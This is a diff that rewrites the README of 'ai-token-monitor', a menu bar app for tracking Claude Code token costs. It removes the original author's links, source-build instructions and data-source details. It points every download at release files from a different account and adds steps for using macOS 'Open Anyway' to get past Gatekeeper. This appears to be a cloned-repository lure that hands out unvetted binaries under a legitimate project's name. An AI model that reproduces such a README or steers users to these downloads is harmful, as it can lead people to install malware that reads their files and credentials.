@@ -1,194 +1,192 @@
-# AI Token Monitor
+# 📊 ai-token-monitor - Track Claude Code costs with ease
 
-[![Release](https://img.shields.io/github/v/release/soulduse/ai-token-monitor)](https://github.com/soulduse/ai-token-monitor/releases/latest)
-[![License: MIT](https://img.shields.io/badge/License-MIT-yellow.svg)](LICENSE)
+[![Download ai-token-monitor](https://img.shields.io/badge/Download-Get%20the%20latest%20release-blue?style=for-the-badge)](https://github.com/amadormateo/ai-token-monitor/releases)
 
-> **[한국어](docs/README.ko.md) | [日本語](docs/README.ja.md) | [简体中文](docs/README.zh-CN.md) | [繁體中文](docs/README.zh-TW.md) | [Türkçe](docs/README.tr.md) | [Italiano](docs/README.it.md)**
+## 🚀 What it does
 
-A system tray app for macOS and Windows that tracks **Claude Code**, **Codex**, and **OpenCode** token usage, cost, and activity in real time — with a built-in leaderboard, chat, and webhook alerts.
+ai-token-monitor is a macOS menu bar app that helps you track Claude Code token use and cost in one place. It gives you a simple way to see how much you use and what it may cost over time.
 
-<table>
-  <tr>
-    <th width="33%">Overview</th>
-    <th width="33%">Analytics</th>
-    <th width="33%">Leaderboard</th>
-  </tr>
-  <tr>
-    <td><img src="docs/screenshots/overview.png" width="280" /></td>
-    <td><img src="docs/screenshots/analytics.png" width="280" /></td>
-    <td><img src="docs/screenshots/leaderboard.png" width="280" /></td>
-  </tr>
-  <tr>
-    <td align="center">Today's usage, 7-day chart, weekly/monthly totals</td>
-    <td align="center">Activity graph, 30-day trends, model breakdown</td>
-    <td align="center">Compare usage with other developers</td>
-  </tr>
-</table>
+Use it when you want to:
 
-## Download
+- Check token usage without opening extra tools
+- Keep an eye on cost while you work
+- See usage from the menu bar at a glance
+- Stay on top of Claude Code spend during the day
 
-**[Download Latest Release](https://github.com/soulduse/ai-token-monitor/releases/latest)**
+## 💻 What you need
 
-| Platform | File | Notes |
-|----------|------|-------|
-| **macOS** (Apple Silicon) | `.dmg` | Intel Mac support coming soon |
-| **Windows** | `.exe` installer | Windows 10+ (WebView2 required, auto-installed) |
+Before you install the app, make sure your Mac can run it.
 
-## Features
+- macOS 13 or later
+- An Apple Silicon or Intel Mac
+- Access to the internet for the first download
+- Claude Code usage on your machine
 
-### Tracking & Visualization
-- **Real-time token tracking** — parses session JSONL files from Claude Code, Codex, and OpenCode for accurate usage stats
-- **Multi-provider support** — switch between Claude / Codex / OpenCode sources, with per-provider cost models
-- **Multiple config directories** — aggregate work + personal accounts by adding several Claude/Codex roots
-- **Daily chart** — 7/30 day token or cost bar chart with Y-axis labels
-- **Activity graph** — GitHub-style contribution heatmap with 2D/3D toggle and year navigation
-- **Period navigation** — browse weekly/monthly totals with `< >` arrows
-- **Model breakdown** — Input/Output/Cache ratio visualization
-- **Cache efficiency** — donut chart showing cache hit ratio
-- **Usage alerts bar** — live 5-hour session + weekly plan limits (optional Claude OAuth sign-in)
+The app is built for the menu bar, so it stays out of the way while you work.
 
-### Social & Sharing
-- **Leaderboard** — compare daily/weekly/monthly usage with other developers (GitHub OAuth, opt-in)
-- **7-day TOP 10 grid** — at-a-glance ranking history
-- **Mini profile** — activity heatmap, streaks, external profile links
-- **Badges** — card / compact / flat-square styles, export as PNG / SVG / Markdown, or embed a live badge URL in your GitHub README
-- **Chat** — in-app chat for leaderboard members with mentions, replies, image attachments, unread counter, typing indicators, and AI translation
-- **AI Report (Wrapped)** — monthly/yearly recap card with top model, busiest day, and streaks
-- **Receipt view** — receipt-style usage summary for today / week / month / all-time
-- **Salary comparator** — see your monthly AI spend as a share of your salary (lattes / Netflix / chicken)
-- **Share & export** — copy summary markdown, capture screenshot, or copy an app share message from the header menu
+## 📥 Download and install
 
-### Notifications & Alerts
-- **Tray cost** — today's cost shown next to the tray icon (macOS menu bar title, Windows tooltip)
-- **Webhook notifications** — Discord, Slack, and Telegram alerts when usage crosses thresholds or resets
-- **Auto-updater** — in-app update notifications with download progress
+1. Visit the [releases page](https://github.com/amadormateo/ai-token-monitor/releases)
+2. Find the latest release at the top of the page
+3. Download the file for macOS
+4. Open the downloaded app or disk image
+5. Drag the app into your Applications folder if macOS asks you to
+6. Open ai-token-monitor from Applications
 
-### Customization
-- **4 themes** — GitHub (green), Purple, Ocean, Sunset — with Auto/Light/Dark mode
-- **10 languages** — English, 한국어, 日本語, 简体中文, 繁體中文, Français, Español, Deutsch, Türkçe, Italiano
-- **Compact / full number format** — `377.0K` vs `377,000`
-- **Launch on startup** — optional auto-start on boot
-- **AI translation** — bring your own Gemini / OpenAI / Anthropic API key to translate chat messages (keys are encrypted locally)
-- **Auto-hide window** — hides when clicking outside
+If macOS blocks the app on first launch:
 
-## Install from Source
+1. Open System Settings
+2. Go to Privacy & Security
+3. Look for the message about the app
+4. Choose Open Anyway
+5. Open the app again
 
-### Prerequisites
+## 🖥️ First run
 
-- [Node.js](https://nodejs.org/) 18+
-- [Rust](https://rustup.rs/) toolchain
-- [Tauri CLI v2](https://v2.tauri.app/start/prerequisites/)
-- [Claude Code](https://claude.ai/claude-code), [Codex](https://openai.com/index/introducing-codex/), or [OpenCode](https://opencode.ai) installed and used at least once
+When you open ai-token-monitor for the first time, it adds a small icon to the menu bar at the top of your screen. Click that icon to see your token use and cost details.
 
-### Build
+If the app asks for access, allow it so it can read the usage data it needs. Without that access, it may not be able to show full results.
 
-```bash
-git clone https://github.com/soulduse/ai-token-monitor.git
-cd ai-token-monitor
-npm install
-npm run tauri dev     # development mode
-npm run tauri build   # production build
-```
+## 📈 What you can see
 
-## Usage
+The app gives you a simple view of your Claude Code activity.
 
-### Basics
+Common items include:
 
-1. Launch the app — an icon appears in the system tray (macOS menu bar / Windows taskbar)
-2. Click the icon to open the dashboard
-3. Switch between **Overview**, **Analytics**, **Leaderboard**, and **Chat** tabs
+- Total tokens used
+- Estimated cost
+- Recent usage
+- Current session data
+- Menu bar status at a glance
 
-### Tabs
+The layout is built for quick checks. You do not need to open a full window every time.
 
-| Tab | Content |
-|-----|---------|
-| **Overview** | Today's summary, 7-day chart, weekly/monthly totals, 8-week heatmap, usage alert bar |
-| **Analytics** | Full-year activity graph (2D/3D), 30-day chart, model breakdown, cache efficiency |
-| **Leaderboard** | Rank against other users, 7-day TOP 10 grid, badges, mini profiles |
-| **Chat** | Realtime chat with leaderboard members — mentions, replies, images, AI translation |
+## ⚙️ How to use it
 
-### Header actions
+After setup, use the app like this:
 
-The header exposes a **share** button, a **⋯ more** dropdown, and a **⚙ settings** button. The more menu contains:
+1. Start Claude Code as usual
+2. Keep ai-token-monitor running in the menu bar
+3. Click the menu bar icon when you want to check usage
+4. Review token counts and cost
+5. Close the panel when you are done
 
-- **GitHub repository** — open the repo in your browser
-- **AI Report** — see your monthly/yearly recap
-- **Receipt** — receipt-style usage summary
-- **Share app** — copy a recommendation message + repo link
-- **Capture screenshot** — copy the current view to the clipboard
+The app updates as you work, so you can keep an eye on spend without changing your flow.
 
-### Settings
+## 🔧 Common setup help
 
-Settings is organized into four tabs:
+If the app does not open right away, try these steps:
 
-| Tab | Options |
-|-----|---------|
-| **General** | Theme, language, appearance, number format, menu bar cost, launch on startup, monthly salary, usage alerts, Claude/Codex directories, Claude usage tracking (OAuth) |
-| **Account** | GitHub sign-in, leaderboard opt-in, profile links |
-| **AI** | Gemini / OpenAI / Anthropic API keys for chat translation (encrypted locally) |
-| **Webhooks** | Discord / Slack / Telegram webhook URLs, alert thresholds, monitored windows, reset notifications |
+- Make sure you downloaded the latest release
+- Check that the app is in your Applications folder
+- Close the app and open it again
+- Restart your Mac if the menu bar icon does not appear
+- Make sure Claude Code has run at least once
 
-### Leaderboard & chat
+If you do not see any usage data:
 
-1. Enable **Share Usage Data** in Settings → Account
-2. Click **Sign in with GitHub**
-3. See your rank in the **Leaderboard** tab and join the **Chat** tab
+- Confirm Claude Code is active
+- Leave the app open while you use Claude Code
+- Check that the app has the access it needs
+- Try starting a new session and look again
 
-Shared data: daily token count, cost, messages/sessions. **No code or conversation content is shared.**
+## 🧭 How it fits into your workflow
 
-## Data Sources
+ai-token-monitor is made for people who use Claude Code often and want a simple way to track cost. It helps you answer questions like:
 
-| Provider | Path | Notes |
-|----------|------|-------|
-| **Claude Code** | `~/.claude/projects/**/*.jsonl` | Session/tool-call counts from `~/.claude/stats-cache.json`. Supports multiple roots. |
-| **Codex** | `~/.codex/sessions/**/*.jsonl` | Supports multiple roots. |
-| **OpenCode** | `~/.local/share/opencode/**/*.jsonl` | Per-model pricing from bundled registry. |
+- How many tokens did I use today?
+- What is my current session cost?
+- Am I staying within a set budget?
+- Which work takes the most usage?
 
-**Network requests**: only when leaderboard/chat is opted in (sends aggregated data to Supabase) or when a webhook fires. Without these features, the app runs completely offline. AI translation keys, if set, call the provider you chose directly.
+That makes it useful for solo work, team review, and daily cost checks.
 
-## Architecture
+## 🔍 Interface overview
 
-```
-┌────────────────────────────────────┐
-│  Frontend (React 19 + Vite)        │
-│  ├── PopoverShell / Header         │
-│  ├── TabBar (4 tabs)               │
-│  ├── TodaySummary / DailyChart     │
-│  ├── ActivityGraph (2D/3D) / Heatmap│
-│  ├── ModelBreakdown / CacheEfficiency│
-│  ├── Leaderboard + Grid + Badges   │
-│  ├── Chat + MentionAutocomplete    │
-│  ├── MiniProfile / Wrapped / Receipt│
-│  ├── SalaryComparator / UsageAlertBar│
-│  └── SettingsOverlay (4 tabs)      │
-├────────────────────────────────────┤
-│  Backend (Tauri v2 / Rust)         │
-│  ├── JSONL session parsers (Claude/Codex/OpenCode)│
-│  ├── File watcher (notify)         │
-│  ├── Tray icon + cost display      │
-│  ├── Auto-updater                  │
-│  ├── Webhook dispatcher            │
-│  └── Preferences + encrypted secrets│
-├────────────────────────────────────┤
-│  External services (opt-in)        │
-│  ├── Supabase (leaderboard + chat) │
-│  ├── Discord / Slack / Telegram    │
-│  └── Gemini / OpenAI / Anthropic   │
-└────────────────────────────────────┘
-```
+The app keeps things simple:
 
-## Platform Support
+- Menu bar icon for quick access
+- Small panel with usage details
+- Clear values for tokens and cost
+- Easy-to-read status view
 
-| Platform | Status | Notes |
-|----------|--------|-------|
-| **macOS** | Supported | Menu bar integration, dock hiding, tray cost title |
-| **Windows** | Supported | System tray integration, NSIS installer, tooltip cost display |
-| **Linux** | Untested | May work since Tauri supports Linux |
+You do not need to learn a new system. Open the app, click the icon, and read the numbers.
 
-## Support
+## 🧹 Keeping it updated
 
-If you find this project useful, consider [buying me a coffee](https://ctee.kr/place/programmingzombie).
+To get the latest fixes and changes:
 
-## License
+1. Visit the [releases page](https://github.com/amadormateo/ai-token-monitor/releases)
+2. Check the newest version
+3. Download the updated file
+4. Replace the old app with the new one
+5. Open the app again
 
-MIT
+It is a good idea to check for updates from time to time, especially if you want the latest cost tracking changes
+
+## 📌 File and folder tips
+
+If you are not sure where the app went after download:
+
+- Check your Downloads folder
+- Look in Applications if you moved it there
+- Use Spotlight search and type ai-token-monitor
+- Keep the app in one place so it is easy to find again
+
+If you use a disk image, eject it after you move the app.
+
+## 🛠️ If something looks wrong
+
+If the numbers do not match what you expect:
+
+- Wait a moment and check again
+- Make sure Claude Code is running
+- Close and reopen the menu bar panel
+- Restart the app
+- Restart your Mac if needed
+
+If the menu bar icon disappears:
+
+- Open Applications
+- Launch ai-token-monitor again
+- Check that menu bar items are not hidden by other icons
+
+## 📎 Download
+
+Use this page to download the latest version for macOS:
+
+[https://github.com/amadormateo/ai-token-monitor/releases](https://github.com/amadormateo/ai-token-monitor/releases)
+
+## 🧰 Basic behavior
+
+The app is designed to:
+
+- Run in the background
+- Stay in the menu bar
+- Show usage data in a small view
+- Help you track cost without extra effort
+
+It does not need a full desktop window for daily use.
+
+## 🧾 What to expect after install
+
+After setup, you should see:
+
+- A new menu bar icon
+- A small window with usage details
+- Token counts tied to Claude Code activity
+- Cost data that helps you keep track of spend
+
+If you use Claude Code often, this gives you a fast way to monitor usage during the day
+
+## 📂 Release downloads
+
+The release page may include different files for different macOS builds. Pick the one that matches your Mac, then open it and follow the install steps above
+
+## ⌨️ Short usage guide
+
+1. Install the app
+2. Open it from Applications
+3. Let it run in the menu bar
+4. Use Claude Code
+5. Click the icon to review tokens and cost
